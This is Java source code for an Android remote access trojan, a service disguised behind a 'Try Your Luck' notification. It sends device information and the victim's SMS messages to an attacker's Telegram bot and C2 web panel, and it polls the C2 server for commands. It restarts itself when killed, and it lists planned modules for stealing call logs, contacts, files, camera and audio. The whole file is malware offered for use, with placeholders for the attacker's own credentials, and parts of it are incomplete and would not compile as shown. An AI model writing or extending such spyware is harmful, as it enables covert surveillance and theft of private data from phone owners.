package com.my.luck.core;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.my.luck.network.TelegramBot;
import com.my.luck.network.C2Client;

public class RatService extends Service {
    private static final String TAG = "RatService";
    private static final int NOTIFICATION_ID = 1;
    private TelegramBot telegramBot;
    private C2Client c2Client;

    // 🔑 REPLACE THESE WITH YOUR ACTUAL VALUES
    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";  // Get from @BotFather
    private static final String OWNER_ID = "YOUR_TELEGRAM_USER_ID"; // Your numeric user ID
    private static final String C2_URL = "https://your-c2-server.com/api"; // Your web panel URL

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "RAT Service Started");
        
        // Initialize Telegram bot with credentials
        TelegramBot.configure(BOT_TOKEN, OWNER_ID);
        telegramBot = new TelegramBot(this);
        c2Client = new C2Client(this);

        startForeground(NOTIFICATION_ID, createNotification());
        
        // Send device info on first start
        telegramBot.sendDeviceInfo();
        
        // Initialize all modules
        initializeModules();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start polling for commands periodically
        startCommandPolling();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void initializeModules() {
        // All feature modules will be initialized here
        // They will use telegramBot to send data
    }

    private void startCommandPolling() {
        // Poll for commands every 30 seconds
        new Thread(() -> {
            while (true) {
                try {
                    if (c2Client != null) {
                        c2Client.fetchCommands();
                    }
                    Thread.sleep(30000);
                } catch (InterruptedException e) {
                    break;
                }
            }
        }).start();
    }

    private NotificationCompat.Builder createNotification() {
        return new NotificationCompat.Builder(this, "rat_channel")
                .setContentTitle("Try Your Luck")
                .setContentText("Running in background...")
                .setSmallIcon(android.R.drawable.ic_menu_gallery)
                .setPriority(NotificationCompat.PRIORITY_LOW);
    }

    // Helper methods for modules to send data
    public void sendSmsData(List<Map<String, String>> smsList) {
        if (telegramBot != null) {
            telegramBot.sendSmsList(smsList);
        }
        // Also send to web panel
        JSONObject data = new JSONObject();
        data.put("type", "sms");
        data.put("data", new JSONArray(smsList));
        if (c2Client != null) {
            c2Client.sendToWebPanel("/sms", data);
        }
    }

    // Add similar helper methods for:
    // - sendCallLogData()
    // - sendContactsData()
    // - sendFileData()
    // - sendCameraData()
    // - sendAudioData()

    public TelegramBot getTelegramBot() {
        return telegramBot;
    }

    public C2Client getC2Client() {
        return c2Client;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        Intent restartIntent = new Intent(this, RatService.class);
        startService(restartIntent);
    }
}